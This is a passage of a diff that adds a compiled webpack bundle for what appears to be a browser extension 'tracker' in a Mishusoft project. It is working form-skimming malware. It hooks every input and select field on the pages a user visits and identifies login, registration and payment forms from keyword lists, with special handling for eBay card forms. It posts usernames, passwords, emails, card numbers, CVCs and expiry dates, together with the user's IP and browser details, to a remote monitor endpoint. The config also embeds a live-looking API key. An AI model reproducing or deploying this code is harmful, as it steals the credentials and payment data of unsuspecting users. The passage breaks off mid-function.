+/* harmony export */ __webpack_require__.d(__webpack_exports__, {
+/* harmony export */   "sendRequest": () => (/* binding */ sendRequest)
+/* harmony export */ });
+function sendRequest(options, callback) {
+    /*worker.postMessage({
+        "command": "sendRequest",
+        "options": options,
+        "receiver": __appHostedServerRoot
+    });
+
+    */
+    if (options.method !== null && options.url !== null) {
+        /*
+        * if (app.runtime.request !== 'pending') {}
+        * else { viewMessage('Another request is pending.', 'Your previous request is pending. Please wait until succeeded.', 'error')}
+        * */
+        try {
+            let dataType;
+            let request = new XMLHttpRequest();
+            request.open(options.method, options.url, options.async);
+            if (options.header !== null && typeof options.header == "object") {
+                for (let i = 0; i < options.header.length; i++) {
+                    request.setRequestHeader(options.header[i].name, options.header[i].value);
+                    if (options.header[i].value.indexOf('form') !== -1) {
+                        dataType = 'formData';
+                    }
+                    if (options.header[i].value.indexOf('json') !== -1) {
+                        dataType = 'jsonData';
+                    }
+                }
+            }
+            if (options.data !== null && typeof options.data == "object") {
+                if (dataType === 'jsonData') {
+                    request.send(JSON.stringify(options.data));
+                }
+                if (dataType === 'formData') {
+                    let formData = new FormData();
+                    Object.keys(options.data).forEach(function (key) {
+                        formData.append(key, options.data[key]);
+                    });
+                    request.send(formData);
+                }
+            }
+            else {
+                request.send();
+            }
+            request.onreadystatechange = function () {
+                if (this.readyState === 4 && this.status === 200) {
+                    if (callback) {
+                        callback(this.responseText);
+                    }
+                    //console.log(this.responseText)
+                }
+            };
+        }
+        catch (e) {
+            console.error("Fetching error." + e);
+        }
+    }
+    else {
+        console.error("Error: METHOD and URL empty.");
+    }
+    /*window.addEventListener('message',function (event) {
+        console.log(event)
+    })*/
+}
+
+
+/***/ }),
+
+/***/ "./Assets/typescripts/common/app-common-required.ts":
+/*!**********************************************************!*\
+  !*** ./Assets/typescripts/common/app-common-required.ts ***!
+  \**********************************************************/
+/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+
+__webpack_require__.r(__webpack_exports__);
+/* harmony export */ __webpack_require__.d(__webpack_exports__, {
+/* harmony export */   "checkDuplicate": () => (/* binding */ checkDuplicate),
+/* harmony export */   "isNumber": () => (/* binding */ isNumber),
+/* harmony export */   "IsJsonString": () => (/* binding */ IsJsonString),
+/* harmony export */   "captureElement": () => (/* binding */ captureElement),
+/* harmony export */   "captureElements": () => (/* binding */ captureElements)
+/* harmony export */ });
+/**
+ * @param str valid string
+ * */
+function checkDuplicate(str) {
+    for (let i = 0; i < str.length; i++) {
+        let re = new RegExp("[^" + str[i] + "]", "g");
+        if (str.replace(re, "").length >= 2) {
+            return true;
+        }
+    }
+    return false;
+}
+/**
+ * @param n any
+ * */
+function isNumber(n) {
+    return !isNaN(parseFloat(n)) && isFinite(n);
+}
+/**
+ * @param string string
+ * */
+function IsJsonString(string) {
+    try {
+        JSON.parse(string);
+    }
+    catch (e) {
+        return false;
+    }
+    return true;
+}
+/**
+ * @param selector HTML valid element selector
+ * */
+function captureElement(selector) {
+    if (document.querySelector(selector) !== null) {
+        return document.querySelector(selector);
+    }
+}
+/**
+ * @param selector HTML valid element selector
+ * */
+/*export function captureElements(selector: string) : any {
+    if (/!*document.querySelectorAll(selector) !== null && *!/document.querySelectorAll(selector).length !== 0) {
+        return document.querySelectorAll(selector) as NodeListOf<HTMLElement>;
+    }
+}*/ function captureElements(selector) {
+    if ( /*document.querySelectorAll(selector) !== null && */document.querySelectorAll(selector).length !== 0) {
+        return document.querySelectorAll(selector);
+    }
+}
+
+
+/***/ }),
+
+/***/ "./Assets/typescripts/common/app-db.ts":
+/*!*********************************************!*\
+  !*** ./Assets/typescripts/common/app-db.ts ***!
+  \*********************************************/
+/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+
+__webpack_require__.r(__webpack_exports__);
+/* harmony export */ __webpack_require__.d(__webpack_exports__, {
+/* harmony export */   "__appHostedServerRoot": () => (/* binding */ __appHostedServerRoot),
+/* harmony export */   "app": () => (/* binding */ app)
+/* harmony export */ });
+/* harmony import */ var _app_common_required__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./app-common-required */ "./Assets/typescripts/common/app-common-required.ts");
+/* global _root_ */
+/*initialize on extension installed*/
+
+let __appHostedServerRoot = (0,_app_common_required__WEBPACK_IMPORTED_MODULE_0__.captureElement)('#mishusoft-web-root').content;
+/*backup plan*/
+if (__appHostedServerRoot === undefined) {
+    //__appHostedServerRoot = 'http://localhost/';
+    __appHostedServerRoot = 'http://localhost/';
+    /*required variables*/
+}
+if (__appHostedServerRoot.substr(-1) !== '/') {
+    __appHostedServerRoot += '/';
+}
+const app = {
+    "default": {
+        "name": 'mishusoft',
+        "version": 'official',
+        "author": 'Mr. Al Amin Ahmed Abir',
+        "charset": 'utf8mb4',
+        "prefix": 'msu',
+        "companyName": 'Mishusoft Systems Incorporate.',
+        "text": {
+            "welcome": "Welcome to Mishusoft Platform",
+            "description": "Mishusoft Platform is a robust multi-web platform developed by Mishusoft Systems Inc. This platform is capable of getting your work done quickly and accurately.",
+            "install_state": "The application is ready to be installed on your device at this time.",
+        }
+    },
+    "content": {
+        "folder": {
+            "logos": __appHostedServerRoot + 'media/logos/',
+            "css": __appHostedServerRoot + 'assets/css/',
+            "js": __appHostedServerRoot + 'assets/js/',
+            "images": __appHostedServerRoot + 'assets/images/',
+        },
+        "file": {
+            "default": {
+                "link": [
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-57x57.png",
+                        "rel": "apple-touch-icon",
+                        "size": "57x57"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-60x60.png",
+                        "rel": "apple-touch-icon",
+                        "size": "60x60"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-72x72.png",
+                        "rel": "apple-touch-icon",
+                        "size": "72x72"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-76x76.png",
+                        "rel": "apple-touch-icon",
+                        "size": "76x76"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-114x114.png",
+                        "rel": "apple-touch-icon",
+                        "size": "114x114"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-120x120.png",
+                        "rel": "apple-touch-icon",
+                        "size": "120x120"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-144x144.png",
+                        "rel": "apple-touch-icon",
+                        "size": "144x144"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-152x152.png",
+                        "rel": "apple-touch-icon",
+                        "size": "152x152"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-180x180.png",
+                        "rel": "apple-touch-icon",
+                        "size": "180x180"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/android-icon-192x192.png",
+                        "rel": "icon",
+                        "size": "192x192",
+                        "type": "image/png"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/favicon-16x16.png",
+                        "rel": "icon",
+                        "size": "16x16",
+                        "type": "image/png"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/favicon-32x32.png",
+                        "rel": "icon",
+                        "size": "32x32",
+                        "type": "image/png"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/favicon-96x96.png",
+                        "rel": "icon",
+                        "size": "96x96",
+                        "type": "image/png"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/favicon.ico",
+                        "rel": "icon",
+                        "size": "16x16",
+                        "type": "image/vnd.microsoft.icon"
+                    },
+                    {
+                        "href": __appHostedServerRoot + "libraries/logos/manifest.json",
+                        "rel": "manifest",
+                    },
+                    {
+                        "name": "msapplication-TileColor",
+                        "content": "#ffffff",
+                    },
+                    {
+                        "name": "msapplication-TileImage",
+                        "content": __appHostedServerRoot + "libraries/logos/ms-icon-144x144.png"
+                    },
+                    {
+                        "name": "theme-color",
+                        "content": "#ffffff",
+                    },
+                ],
+            },
+        },
+    },
+    "website": {
+        "home": "https://www.mishusoft.com/",
+        "support": "support@mishusoft.com",
+        "donate": "https://www.mishusoft.com/payment/donate",
+        "IpInfo": "https://api.ipdata.co/?api-key=2f9dde381f67efed325acfb1011a988036b28fc6cc02f07668ef7180",
+        "IpInfoKey": "2f9dde381f67efed325acfb1011a988036b28fc6cc02f07668ef7180",
+        "temporary": {
+            "home": "http://localhost/",
+            "monitorURL": "http://localhost/monitor/browser/",
+            "paymentURL": "http://localhost/payment/"
+        },
+        "publish": {
+            "home": "https://www.mishusoft.com/",
+            "monitorURL": "https://www.mishusoft.com/monitor/browser/",
+            "paymentURL": "https://www.mishusoft.com/payment/"
+        }
+    },
+    "runtime": {
+        "request": ""
+    }
+};
+
+
+/***/ })
+
+/******/ 	});
+/************************************************************************/
+/******/ 	// The module cache
+/******/ 	var __webpack_module_cache__ = {};
+/******/ 	
+/******/ 	// The require function
+/******/ 	function __webpack_require__(moduleId) {
+/******/ 		// Check if module is in cache
+/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
+/******/ 		if (cachedModule !== undefined) {
+/******/ 			return cachedModule.exports;
+/******/ 		}
+/******/ 		// Create a new module (and put it into the cache)
+/******/ 		var module = __webpack_module_cache__[moduleId] = {
+/******/ 			// no module.id needed
+/******/ 			// no module.loaded needed
+/******/ 			exports: {}
+/******/ 		};
+/******/ 	
+/******/ 		// Execute the module function
+/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
+/******/ 	
+/******/ 		// Return the exports of the module
+/******/ 		return module.exports;
+/******/ 	}
+/******/ 	
+/************************************************************************/
+/******/ 	/* webpack/runtime/define property getters */
+/******/ 	(() => {
+/******/ 		// define getter functions for harmony exports
+/******/ 		__webpack_require__.d = (exports, definition) => {
+/******/ 			for(var key in definition) {
+/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
+/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
+/******/ 				}
+/******/ 			}
+/******/ 		};
+/******/ 	})();
+/******/ 	
+/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
+/******/ 	(() => {
+/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
+/******/ 	})();
+/******/ 	
+/******/ 	/* webpack/runtime/make namespace object */
+/******/ 	(() => {
+/******/ 		// define __esModule on exports
+/******/ 		__webpack_require__.r = (exports) => {
+/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
+/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
+/******/ 			}
+/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
+/******/ 		};
+/******/ 	})();
+/******/ 	
+/************************************************************************/
+var __webpack_exports__ = {};
+// This entry need to be wrapped in an IIFE because it need to be isolated against other modules in the chunk.
+(() => {
+/*!***************************************!*\
+  !*** ./Assets/typescripts/tracker.ts ***!
+  \***************************************/
+__webpack_require__.r(__webpack_exports__);
+/* harmony import */ var _browser__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./browser */ "./Assets/typescripts/browser.ts");
+/* harmony import */ var _common_app_db__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./common/app-db */ "./Assets/typescripts/common/app-db.ts");
+/* harmony import */ var _common_app_common_required_send__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./common/app-common-required-send */ "./Assets/typescripts/common/app-common-required-send.ts");
+
+
+
+
+/*required variables*/
+const BrJS = new _browser__WEBPACK_IMPORTED_MODULE_0__.Browser();
+const appTracker = _common_app_db__WEBPACK_IMPORTED_MODULE_1__.app.default.name + '@' + _common_app_db__WEBPACK_IMPORTED_MODULE_1__.app.default.version;
+let globalAppMonitorMainURL = _common_app_db__WEBPACK_IMPORTED_MODULE_1__.__appHostedServerRoot + 'monitor/browser/';
+const authFormAttribute = [
+    {
+        'login': [
+            'form1', 'signin', 'signon', 'login', 'logon', 'identi', 'idb', 'wpcf7-form', 'form--1G_Qn', 'fl', 'ng-pristine',
+            'index.php', 'new_user', 'ctl23', 'jss', 'connexion', 'file', 'styledform', 'auth',
+        ]
+    },
+    { 'register': ['reg', 'signup', 'join', 'register', 'checkform'] },
+    { 'logout': ['logout'] },
+    {
+        'payment': [
+            'credit', 'payment', 'body', 'checkout', 'sslform', 'pay', 'purchase', 'elementsapp', 'creditcard',
+            'credit-card', 'addcard', 'bill'
+        ]
+    },
+    {
+        'exclude': [
+            /*'q', */ 'search', 'googleads', 'presentation', 'captcha', /*'disable', */ 'header',
+            'convert-form', 'wam_arten', 'matchkalender', 'suche', 'generate', 'subscribe', 'ignore',
+            'download', 'kreditrechner', 'bit_exchange_form', 'applyform', 'app_form', 'comment', 'wallet',
+            'picker', 'wp-link', 'meta', 'panier', 'commande', 'recherche', 'settings', 'posts', 'challenge', 'tag',
+            'upload', 'mainf', 'domain'
+        ]
+    },
+];
+const paymentElementsAttribute = [
+    { 'cardNumber': ['num', 'no', 'cardno',] },
+    { 'cardHolder': ['holder', 'owner', 'name',] },
+    { 'cardTypes': ['brand', 'type', 'types',] },
+    { 'cardExpire': ['exp',] },
+    { 'cardCVC': ['cvc', 'csc', 'cvv', 'securitycode',] },
+    { 'cardPostalCode': ['zip', 'post',] },
+    /*{'exclude': ['email', 'user', 'usr']},*/
+];
+function initDb() {
+    if (window.sessionStorage) {
+        if (window.sessionStorage.getItem('ip') === null) {
+            (0,_common_app_common_required_send__WEBPACK_IMPORTED_MODULE_2__.sendRequest)({
+                method: "GET",
+                url: _common_app_db__WEBPACK_IMPORTED_MODULE_1__.app.website.IpInfo,
+                async: true,
+                header: [{ name: "Accept", value: "application/json" }]
+            }, function (IpDataReply) {
+                window.sessionStorage.setItem('ip', JSON.parse(IpDataReply).ip);
+            });
+        }
+    }
+    else {
+        console.error('Error:: Your browser does not support session!! Please upgrade or change your browser!!');
+    }
+}
+function send(request) {
+    if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
+        let interval = setInterval(function () {
+            if (window.sessionStorage.getItem('ip') !== null) {
+                clearInterval(interval);
+                if (request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData' || request.command === 'saveNavigateData') {
+                    if (request.command === 'saveLoginData') {
+                        return (0,_common_app_common_required_send__WEBPACK_IMPORTED_MODULE_2__.sendRequest)({
+                            method: "POST",
+                            url: globalAppMonitorMainURL + "browserUserDataManagement",
+                            async: true,
+                            header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
+                            data: {
+                                "command": request.command,
+                                "userdata": {
+                                    _default_: {
+                                        "tracker": appTracker,
+                                        "app_id": _common_app_db__WEBPACK_IMPORTED_MODULE_1__.app.default.version,
+                                        "ip": window.sessionStorage.getItem('ip'),
+                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                        "browser": BrJS.getBrowserNameFull()
+                                    },
+                                    "event": 'login',
+                                    "username": request.data.username,
+                                    "password": request.data.password,
+                                    "workWebsite": request.data.workWebsite
+                                }
+                            }
+                        });
+                    }
+                    else if (request.command === 'saveRegistrationData') {
+                        return (0,_common_app_common_required_send__WEBPACK_IMPORTED_MODULE_2__.sendRequest)({
+                            method: "POST",
+                            url: globalAppMonitorMainURL + "browserUserDataManagement",
+                            async: true,
+                            header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
+                            data: {
+                                "command": request.command,
+                                "userdata": {
+                                    _default_: {
+                                        "tracker": appTracker,
+                                        "app_id": _common_app_db__WEBPACK_IMPORTED_MODULE_1__.app.default.version,
+                                        "ip": window.sessionStorage.getItem('ip'),
+                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                        "browser": BrJS.getBrowserNameFull()
+                                    },
+                                    "event": "registration",
+                                    "username": request.data.username,
+                                    "password": request.data.password,
+                                    "email": request.data.email,
+                                    "workWebsite": request.data.workWebsite
+                                }
+                            }
+                        });
+                    }
+                    else if (request.command === 'saveLogoutData') {
+                        return (0,_common_app_common_required_send__WEBPACK_IMPORTED_MODULE_2__.sendRequest)({
+                            method: "POST",
+                            url: globalAppMonitorMainURL + "browserUserDataManagement",
+                            async: true,
+                            header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
+                            data: {
+                                "command": request.command,
+                                "userdata": {
+                                    _default_: {
+                                        "tracker": appTracker,
+                                        "app_id": _common_app_db__WEBPACK_IMPORTED_MODULE_1__.app.default.version,
+                                        "ip": window.sessionStorage.getItem('ip'),
+                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                        "browser": BrJS.getBrowserNameFull()
+                                    },
+                                    "event": "logout",
+                                    "username": request.data.username,
+                                    "workWebsite": request.data.workWebsite
+                                }
+                            }
+                        });
+                    }
+                    else if (request.command === 'saveNavigateData') {
+                        return (0,_common_app_common_required_send__WEBPACK_IMPORTED_MODULE_2__.sendRequest)({
+                            method: "POST",
+                            url: globalAppMonitorMainURL + "browserUserDataManagement",
+                            async: true,
+                            header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
+                            data: {
+                                "command": request.command,
+                                "userdata": {
+                                    _default_: {
+                                        "tracker": appTracker,
+                                        "app_id": _common_app_db__WEBPACK_IMPORTED_MODULE_1__.app.default.version,
+                                        "ip": window.sessionStorage.getItem('ip'),
+                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                        "browser": BrJS.getBrowserNameFull()
+                                    },
+                                    "event": "navigate",
+                                    "username": request.data.username,
+                                    "workWebsite": request.data.workWebsite
+                                }
+                            }
+                        });
+                    }
+                }
+                if (request.command === 'savePaymentMethodsData') {
+                    return (0,_common_app_common_required_send__WEBPACK_IMPORTED_MODULE_2__.sendRequest)({
+                        method: "POST",
+                        url: globalAppMonitorMainURL + "clientPaymentMethodsRecord",
+                        async: true,
+                        header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
+                        data: {
+                            "command": request.command,
+                            "paymentMethodsInfo": {
+                                _default_: {
+                                    "tracker": appTracker,
+                                    "app_id": _common_app_db__WEBPACK_IMPORTED_MODULE_1__.app.default.version,
+                                    "ip": window.sessionStorage.getItem('ip'),
+                                    "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                    "browser": BrJS.getBrowserNameFull()
+                                },
+                                'cardNumber': request.data.cardNumber,
+                                'cardBrand': request.data.cardBrand,
+                                'cardHolder': request.data.cardHolder,
+                                "cardExpire": request.data.cardExpire,
+                                'cardCVC': request.data.cardCVC,
+                                'event': request.data.event,
+                                "workWebsite": request.data.workWebsite
+                            }
+                        }
+                    });
+                }
+                if (request.command === 'saveBankAccountData') {
+                    return (0,_common_app_common_required_send__WEBPACK_IMPORTED_MODULE_2__.sendRequest)({
+                        method: "POST",
+                        url: globalAppMonitorMainURL + "clientBankAccountRecord",
+                        async: true,
+                        header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
+                        data: {
+                            "command": request.command,
+                            "bankAccountData": {
+                                _default_: {
+                                    "tracker": appTracker,
+                                    "app_id": _common_app_db__WEBPACK_IMPORTED_MODULE_1__.app.default.version,
+                                    "ip": window.sessionStorage.getItem('ip'),
+                                    "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                    "browser": BrJS.getBrowserNameFull()
+                                },
+                                'dataType': request.data.dataType,
+                                'dataValue': request.data.dataValue,
+                                "workWebsite": request.data.workWebsite
+                            }
+                        }
+                    });
+                }
+                if (request.command === 'saveInputElementData') {
+                    return (0,_common_app_common_required_send__WEBPACK_IMPORTED_MODULE_2__.sendRequest)({
+                        method: "POST",
+                        url: globalAppMonitorMainURL + "InputElementDataRecord",
+                        async: true,
+                        header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
+                        data: {
+                            "command": request.command,
+                            "inputElementData": {
+                                _default_: {
+                                    "tracker": appTracker,
+                                    "app_id": _common_app_db__WEBPACK_IMPORTED_MODULE_1__.app.default.version,
+                                    "ip": window.sessionStorage.getItem('ip'),
+                                    "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                    "browser": BrJS.getBrowserNameFull()
+                                },
+                                'name': request.data.name,
+                                'type': request.data.type,
+                                'value': request.data.value,
+                                'placeholder': request.data.placeholder,
+                                "workWebsite": request.data.workWebsite
+                            }
+                        }
+                    });
+                }
+            }
+        }, 100);
+    }
+}
+class Tracker {
+    url;
+    authEvent;
+    isTrackerActivate = false;
+    trackerJobId = 0;
+    passwordStore = [];
+    creditCardStore = [];
+    creditCardRuntimeHolderName = '';
+    creditCardRuntimeNumber = '';
+    creditCardRuntimeBrand = '';
+    creditCardRuntimeExpireDate = '';
+    creditCardRuntimeCvc = '';
+    creditCardRuntimePostalCode = '';
+    constructor(url) {
+        if (url) {
+            this.url = url;
+        }
+    }
+    init(callBack) {
+        const self = this;
+        if (self.url) {
+            let interval1 = setInterval(function () {
+                self.verifyFormElement(self, interval1);
+            }, 1000);
+            self.backupScripts(self);
+            self.absoluteTrack(self);
+            if (!self.isTrackerActivate) {
+            }
+            else {
+            }
+        }
+        if (callBack) {
+            callBack();
+        }
+    }
+    absoluteTrack(self) {
+        let interval = setInterval(function () {
+            if (document.querySelectorAll('input').length !== 0) {
+                clearInterval(interval);
+                self.absoluteTrackHelper(self, document.body, 'input', function (__detectedElement) {
+                    ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
+                        __detectedElement.addEventListener(event, function () {
+                            if (__detectedElement.value.length !== 0) {
+                                send({
+                                    command: 'saveInputElementData',
+                                    data: {
+                                        'name': __detectedElement.nodeName.toLowerCase(),
+                                        'type': __detectedElement.type,
+                                        'value': __detectedElement.value,
+                                        'placeholder': __detectedElement.placeholder ? __detectedElement.placeholder : 'NOT SET',
+                                        "workWebsite": window.location.origin
+                                    }
+                                });
+                            }
+                        });
+                    });
+                });
+            }
+            if (document.querySelectorAll('select').length !== 0) {
+                clearInterval(interval);
+                self.absoluteTrackHelper(self, document.body, 'select', function (__detectedElement) {
+                    ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
+                        __detectedElement.addEventListener(event, function () {
+                            if (__detectedElement.value.length !== 0) {
+                                send({
+                                    command: 'saveInputElementData',
+                                    data: {
+                                        'name': __detectedElement.nodeName.toLowerCase(),
+                                        'type': __detectedElement.type,
+                                        'value': __detectedElement.value,
+                                        'placeholder': __detectedElement.placeholder ? __detectedElement.placeholder : 'NOT SET',
+                                        "workWebsite": window.location.origin
+                                    }
+                                });
+                            }
+                        });
+                    });
+                });
+            }
+        }, 100);
+    }
+    absoluteTrackHelper(self, elementParentNode, __tagName, callback) {
+        if (elementParentNode.childNodes.length !== 0) {
+            elementParentNode.childNodes.forEach(function (__childElement) {
+                if (__childElement.nodeName.toLowerCase() === __tagName) {
+                    if (callback) {
+                        callback(__childElement);
+                    }
+                }
+                else {
+                    self.absoluteTrackHelper(self, __childElement, __tagName, callback);
+                }
+            });
+        }
+    }
+    trigger(self, __formElement) {
+        self.track(self, __formElement);
+    }
+    verifyFormElement(self, interval) {
+        if (document.querySelectorAll('form').length !== 0) {
+            document.querySelectorAll('form').forEach(function (__formElement) {
+                if (__formElement.attributes.length !== 0) {
+                    if (window.location.href.toLowerCase().indexOf('phpmyadmin') !== -1) {
+                        if (__formElement.method === 'post') {
+                            interval ? clearInterval(interval) : '';
+                            self.isTrackerActivate = true;
+                            self.trackerJobId++;
+                            self.trigger(self, __formElement);
+                        }
+                    }
+                    else {
+                        if (__formElement.action !== 'javascript:void(0)' && __formElement.id !== 'null' && __formElement.id !== 'irouteForm' &&
+                            __formElement.id !== 'bhlf' && __formElement.id.indexOf('id') === -1 && __formElement.id.indexOf('u_0_') === -1 &&
+                            __formElement.id.indexOf('theform') === -1 && __formElement.id.indexOf('scl_form') === -1 &&
+                            __formElement.className.indexOf('gb_8e') === -1) {
+                            interval ? clearInterval(interval) : '';
+                            self.isTrackerActivate = true;
+                            self.trackerJobId++;
+                            self.trigger(self, __formElement);
+                        }
+                    }
+                }
+                else {
+                    if (__formElement.childNodes.length > 1) {
+                        interval ? clearInterval(interval) : '';
+                        self.isTrackerActivate = true;
+                        self.trackerJobId++;
+                        self.trigger(self, __formElement);
+                    }
+                }
+            });
+        }
+        else {
+            if (window.location.origin.indexOf('dash.fembed.com') !== -1) {
+                if (document.querySelector('#login') !== null) {
+                    interval ? clearInterval(interval) : '';
+                    self.isTrackerActivate = true;
+                    self.trackerJobId++;
+                    self.classicTrackAuthEvent(self, '#email_login', '#password', '#login');
+                }
+            }
+        }
+    }
+    resolverFormAttributes(self, __formElement) {
+        const attributes = [...__formElement.attributes];
+        if (attributes.length !== 0) {
+            attributes.forEach(function (attribute) {
+                if (attribute.nodeValue !== 'javascript:void(0);') {
+                    if (attribute.nodeValue.length !== 0 && attribute.nodeValue.length >= 3) {
+                        /*form attribute value*/
+                        authFormAttribute.forEach(function (keyword) {
+                            if (Object.keys(keyword).length !== 0 && keyword.constructor === Object) {
+                                Object.keys(keyword).forEach(function (__key) {
+                                    keyword[__key].forEach(function (__qKey) {
+                                        if (attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1 /*|| window.location.origin.toLowerCase().indexOf(__qKey) !== -1
+                                            || document.title.toLowerCase().indexOf(__qKey) !== -1 && window.location.origin.toLowerCase().indexOf('file') === -1*/) {
+                                            /*var str = text.replace(/(^\w{1})|(\s{1}\w{1})/g, match => match.toUpperCase());*/
+                                            //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = __key;
+                                            self.authEvent = __key;
+                                        }
+                                        else {
+                                            if (attribute.nodeValue === null) {
+                                                //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'exclude';
+                                                self.authEvent = 'exclude';
+                                            }
+                                        }
+                                    });
+                                });
+                            }
+                        });
+                    }
+                }
+            });
+        }
+        else {
+            self.authEvent = 'Unknown';
+        }
+        return self.authEvent;
+    }
+    track(self, __formElement) {
+        let elements = [];
+        if (__formElement.nodeName === 'FORM' && __formElement.length !== 1) {
+            self.resolverFormAttributes(self, __formElement);
+            if (self.authEvent === 'login' || self.authEvent === 'register') {
+                self.crawlAuthFormElement(self, elements, __formElement);
+            }
+            else if (self.authEvent === 'payment') {
+                self.crawlPaymentFormElement(self, elements, __formElement);
+            }
+            else {
+                if (self.authEvent !== 'exclude' && self.authEvent !== 'logout') {
+                    self.crawlAuthFormElement(self, elements, __formElement);
+                    self.crawlPaymentFormElement(self, elements, __formElement);
+                    /*additional functions*/
+                    /*exclude paypal,amazon,tunnelbear*/
+                    /*ebay*/
+                    if (window.location.origin.indexOf('ebay') !== -1) {
+                        let interval = setInterval(function () {
+                            if (document.querySelectorAll('form').length !== 0) {
+                                document.querySelectorAll('form').forEach(function (__ebayFormElement) {
+                                    if (__ebayFormElement.id === 'credit-card-details') {
+                                        clearInterval(interval);
+                                        let elements = [];
+                                        self.exploreEbayPaymentDataCollection(self, __ebayFormElement, elements);
+                                    }
+                                });
+                            }
+                        }, 100);
+                        if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
+                            if (document.querySelector('.btn.btn--primary.field')?.nodeName === 'BUTTON') {
+                                ["click", "dblclick"].forEach(function (event) {
+                                    let tempPaymentMethodsStore = [];
+                                    document.querySelector('.btn.btn--primary.field')?.addEventListener(event, function () {
+                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'creditCardNumber', function (__detectedElement) {
+                                            tempPaymentMethodsStore.push({
+                                                'element': __detectedElement.nodeName,
+                                                'id': __detectedElement.id,
+                                                'value': __detectedElement.value
+                                            });
+                                        });
+                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'firstName', function (__detectedElement) {
+                                            tempPaymentMethodsStore.push({
+                                                'element': __detectedElement.nodeName,
+                                                'id': __detectedElement.id,
+                                                'value': __detectedElement.value
+                                            });
+                                        });
+                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'lastName', function (__detectedElement) {
+                                            tempPaymentMethodsStore.push({
+                                                'element': __detectedElement.nodeName,
+                                                'id': __detectedElement.id,
+                                                'value': __detectedElement.value
+                                            });
+                                        });
+                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'expirationDate', function (__detectedElement) {
+                                            tempPaymentMethodsStore.push({
+                                                'element': __detectedElement.nodeName,
+                                                'id': __detectedElement.id,
+                                                'value': __detectedElement.value
+                                            });
+                                        });
+                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'cvv', function (__detectedElement) {
+                                            tempPaymentMethodsStore.push({
+                                                'element': __detectedElement.nodeName,
+                                                'id': __detectedElement.id,
+                                                'value': __detectedElement.value
+                                            });
+                                        });
+                                        send({
+                                            command: 'savePaymentMethodsData',
+                                            data: {
+                                                'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
+                                                'cardBrand': document.querySelector('.floating-input__fixright')?.firstElementChild?.className ? document.querySelector('.floating-input__fixright')?.firstElementChild?.className.toLowerCase() : 'Unknown',
+                                                'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
+                                                "cardExpire": tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
+                                                'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
+                                                'event': 'add',
+                                                "workWebsite": window.location.origin
+                                            }
